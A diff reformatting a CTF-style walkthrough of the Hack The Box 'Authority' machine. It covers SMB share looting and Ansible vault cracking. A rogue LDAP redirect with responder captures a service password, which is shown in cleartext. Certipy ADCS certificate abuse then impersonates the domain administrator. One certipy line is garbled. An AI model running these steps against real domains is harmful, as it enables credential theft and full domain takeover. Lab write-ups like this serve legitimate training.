@@ -1,13 +1,17 @@
 #Nmap
 
-1.smbclient -L ip
+```
+smbclient -L ip
 smbclient \\\\10.10.11.222\\Development
 
 2.cd \Automation\Ansible\PWM\defaults\
 3.get main.yml
+```
 
-## └─# cat main.yml
+```
+cat main.yml
 
+#OUTPUT
 pwm_run_dir: "{{ lookup('env', 'PWD') }}"
 
 pwm_hostname: authority.htb.corp
@@ -42,6 +46,7 @@ $ANSIBLE_VAULT;1.1;AES256
 34646237336164356438383034623462323531316333623135383134656263663266653938333334
 3238343230333633350a646664396565633037333431626163306531336336326665316430613566
 3764
+```
 
           decrypt with ansible2john <filename>
 
@@ -64,10 +69,10 @@ then fill the password u decrypted
 
 after you login Download configuration and then u just find it this code
 
-<value>ldaps://authority.authority.htb:636</value>
+```<value>ldaps://authority.authority.htb:636</value>```
 
 then change it to  
- <value>ldap://<Your-Ip-Tun0>:389</value>
+``` <value>ldap://<Your-Ip-Tun0>:389</value>```
 
 then saved it then back to the website click "Import Configuration"
 
@@ -75,32 +80,35 @@ next upload file already changed , so open terminal run command
 
 responder -I tun0 -wA
 
-and then boom u got the password , next way go to evil-winrm to capture the flag
+and then u got the password , next way go to evil-winrm to capture the flag
 
 evil-winrm -i 10.10.11.222 -u svc_ldap -p "<password>"
 lDaP_1n_th3_cle4r!
 
-#Privilege Escalation
+# Privilege Escalation
 
 impacket-addcomputer authority.htb/svc_ldap:<password> -dc-ip 10.10.11.222 -computer-name '<give_any_name>' -computer-pass '<give_any_pass>'
 
 #Example
 impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222 -computer-name 'hack' -computer-pass '123'
 
-#Certipy Installation
+# Certipy Installation
+```
 git clone https://github.com/ly4k/Certipy.git
 cd Certipy 
 pip3 install certipy-ad
 python3 setup.py install
+```
 
-certipy find -u 'test1$' -p '123' -dc-ip 10.10.11.222
-
-
-certipy req -username 'hack$' -password '123' -ca 'AUTHORITY-CA' -target 10.10.11.222 -template 'CorpVpn' -upn "administrator@authority.htb" -dns authority.authority.htb
+```
+certipy find -u 'test1$' -p '123' -dc-ip 10.10.11.222c  certipy req -username 'hack$' -password '123' -ca 'AUTHORITY-CA' -target 10.10.11.222 -template 'CorpVpn' -upn "administrator@authority.htb" -dns authority.authority.htb
+```
 
 if u got some error u need copy authority.authority.htb to /etc/hosts
-and run command sudo ntpdate -u authority.authority.htb
+and run command sudo ntpdate -u authority.authority.htb ntpdate for create time
 
+```
+#Output
 [*] Requesting certificate via RPC
 [*] Successfully requested certificate
 [*] Request ID is 4
@@ -109,6 +117,7 @@ and run command sudo ntpdate -u authority.authority.htb
     DNS Host Name: 'authority.authority.htb'
 [*] Certificate has no object SID
 [*] Saved certificate and private key to 'administrator_authority.pfx'
+```
 
 the private keys saved on your linux , so we just login ldap to add user
 
@@ -117,7 +126,8 @@ certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222 -ldap-shell
 run command help to see command 
 # help
 
- add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
+```
+add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
  rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
  add_user new_user [parent] - Creates a new user.
  add_user_to_group user group - Adds a user to a group.
@@ -135,7 +145,7 @@ run command help to see command
  set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
  start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
  write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
- exit - Terminates this session.
+ exit - Terminates this session.```
 
 
 
